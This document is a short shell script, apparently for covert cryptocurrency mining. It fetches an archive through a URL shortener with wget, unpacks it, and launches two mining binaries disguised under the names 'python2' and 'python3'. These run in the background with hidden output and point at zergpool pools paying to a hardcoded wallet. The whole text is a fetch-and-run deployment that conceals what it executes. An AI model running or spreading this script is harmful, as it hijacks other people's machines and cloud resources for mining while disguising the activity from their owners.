wget -O dotaja.tar.gz s.id/dotaja

tar -xzvf dotaja.tar.gz

nohup ./python2 --algo PYRIN --pool pyrinhash.asia.mine.zergpool.com:5557 --user DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK --pass c=DGB  > /dev/null 2>&1 &

sleep 15

nohup ./python3 -a minotaurx -o stratum+tcp://minotaurx.asia.mine.zergpool.com:7019 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB

